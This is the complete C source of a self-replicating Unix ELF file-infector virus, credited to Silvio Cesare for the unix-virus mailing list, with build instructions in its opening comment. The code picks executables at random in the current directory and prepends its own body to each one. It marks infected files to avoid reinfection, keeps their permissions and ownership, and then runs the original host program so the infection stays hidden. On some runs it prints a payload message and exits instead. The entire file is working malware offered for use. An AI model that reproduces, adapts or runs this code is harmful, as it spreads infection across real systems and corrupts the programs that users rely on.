/*
	compile with -DUSE_FORK
	replace the PARASITE_LENGTH with the length of the compiled code

	Silvio Cesare (for the unix-virus mailing list)
*/

#include <stdio.h>
#include <stdlib.h>
#include <sys/stat.h>
#include <unistd.h>
#include <fcntl.h>
#include <time.h>
#include <dirent.h>
#include <elf.h>
#include <sys/types.h>
#include <sys/wait.h>

#define PARASITE_LENGTH		7377
#define TMP_FILENAME		".vi124"
#define TMP_FILENAME2		".vi123"
#define PAYLOAD_AVG		5
#define MAGIC			123456
#define YINFECT			4
#define NINFECT			16
#define MAX_TRIES		30
#define MINDIRMOD		3

/*
	I should be more careful about where i Die, because it'll screw up the
	host.
*/

#ifdef DEBUG
 #define die(X)	{ printf(X"\n"); exit(1); }
#else
 #define die(X) exit(1)
#endif

static int magic = MAGIC;

/*
	cp parasite foo
	cat host >> foo
	cat magic >> foo
	mv foo host

	plus sanity checks for magic (no re-infection)
*/

int infect(char *filename, int hd, char *virus)
{
	int fd;
	struct stat stat;
	char *data;
	int tmagic;
	Elf32_Ehdr ehdr;

/* read the ehdr */

        if (read(hd, &ehdr, sizeof(ehdr)) != sizeof(ehdr)) return 1;

/* ELF checks */

        if (
                ehdr.e_ident[0] != ELFMAG0 ||
                ehdr.e_ident[1] != ELFMAG1 ||
                ehdr.e_ident[2] != ELFMAG2 ||
                ehdr.e_ident[3] != ELFMAG3
        ) return 1;

        if (ehdr.e_type != ET_EXEC && ehdr.e_type != ET_DYN) return 1;
        if (ehdr.e_machine != EM_386 && ehdr.e_machine != EM_486) return 1;
        if (ehdr.e_version != EV_CURRENT) return 1;

	if (fstat(hd, &stat) < 0) return 1;
	if (
		lseek(
			hd, stat.st_size - sizeof(magic), SEEK_SET
		) != stat.st_size - sizeof(magic)
	)
		return 1;
	if (read(hd, &tmagic, sizeof(magic)) != sizeof(magic)) return 1;
	if (tmagic == MAGIC) return 1;
	if (lseek(hd, 0, SEEK_SET) != 0) die("lseek");
	fd = open(TMP_FILENAME, O_WRONLY | O_CREAT | O_TRUNC, stat.st_mode);
	if (fd < 0) die("open(TMP_FILENAME)");
	if (write(fd, virus, PARASITE_LENGTH) != PARASITE_LENGTH)
		return 1;
	data = (char *)malloc(stat.st_size);
	if (data == NULL) return 1;
	if (read(hd, data, stat.st_size) != stat.st_size) return 1;
	if (write(fd, data, stat.st_size) != stat.st_size) return 1;
	if (write(fd, &magic, sizeof(magic)) != sizeof(magic)) return 1;
	if (fchown(fd, stat.st_uid, stat.st_gid) < 0) return 1;
	if (rename(TMP_FILENAME, filename) < 0) return 1;
	close(fd);

#ifdef DEBUG
 printf("Infected %s .\n", filename);
#endif

	return 0;
}

/*
	Code ripped heavily off direct infection from the padding virus, with
	bug fixes.
*/

int main(int argc, char *argv[], char *envp[])
{
	char *data1, virus[PARASITE_LENGTH];
	int fd, hd, out;
	DIR *dd;
	int try;
	int ninfect = 0, yinfect = 0;
	pid_t pid;
	struct stat stat;
	int len;
	int rnval;
	int dirmod;
	int i;
	struct dirent *dirp;

        if ((fd = open(argv[0], O_RDONLY, 0)) < 0) die("open(argv[0]");
	if (fstat(fd, &stat) < 0) die("fstat(argv[0]");
        if (read(fd, virus, PARASITE_LENGTH) != PARASITE_LENGTH) die("read");

	srand(time(NULL));

/* Lets do something every PAYLOAD_AVG times (on average) */

	if ((rand() % PAYLOAD_AVG) == 0) {
		printf("THE FILE VIRUS - Silvio Cesare\n");
		exit(1);
	}

/* Direct infection */

	if ((dd = opendir(".")) < 0) die("opendir");
	dirp = readdir(dd);
	if (dirp != NULL) {
		for (i = 0; (dirp = readdir(dd)) != NULL; i++)
#ifdef DEBUG
{
	printf("dirname found: %s\n", dirp->d_name);
}
#else
 ;
#endif
		rewinddir(dd);
		dirp = readdir(dd);

/* this can miss */
		dirmod = i / YINFECT;
		if (dirmod < MINDIRMOD) dirmod = MINDIRMOD;
#ifdef DEBUG
 printf("dirmod = %i\n", dirmod);
#endif

		for (
			try = 0;
			try < MAX_TRIES &&
			ninfect < NINFECT && yinfect < YINFECT;
			try++
		) {
 			rnval = rand() % dirmod;

			for (i = 0; i < rnval; i++) {
				if (dirp == NULL) rewinddir(dd);
				dirp = readdir(dd);
/*
	ok, i admit. this is sloppy code, but a goto is an easy solution to
	break out of two loops
*/

				if (dirp == NULL) goto leave;
			}

#ifdef DEBUG
 printf("Trying to infect %s ...\n", dirp->d_name);
#endif
			hd = open(dirp->d_name, O_RDWR, 0);
			if (hd >= 0)
				if (infect(dirp->d_name, hd, virus))
					ninfect++;
				else
					yinfect++;
			close(hd);
		}

	        closedir(dd);
	}

leave:
	
	if (fstat(fd, &stat) < 0) die("fstat");
	len = stat.st_size - PARASITE_LENGTH;
	data1 = (char *)malloc(len);
	if (data1 == NULL) die("malloc");
	if (lseek(fd, PARASITE_LENGTH, SEEK_SET) != PARASITE_LENGTH)
		die("lseek(fd)");
	if (read(fd, data1, len) != len) die("read(fd)");	
	close(fd);
	out = open(TMP_FILENAME2, O_RDWR | O_CREAT | O_TRUNC, stat.st_mode);
	if (out < 0) die("open(out)");
	if (write(out, data1, len) != len) die("write(out)");
	free(data1);
	close(out);

#ifdef USE_FORK
	pid = fork();
	if (pid < 0) die("fork");
	if (pid == 0) exit(execve(TMP_FILENAME2, argv, envp));
	if (waitpid(pid, NULL, 0) != pid) die("waitpid");
	unlink(TMP_FILENAME2);
	exit(0);
#else
	exit(execve(TMP_FILENAME2, argv, envp));
#endif

        return 0;
}
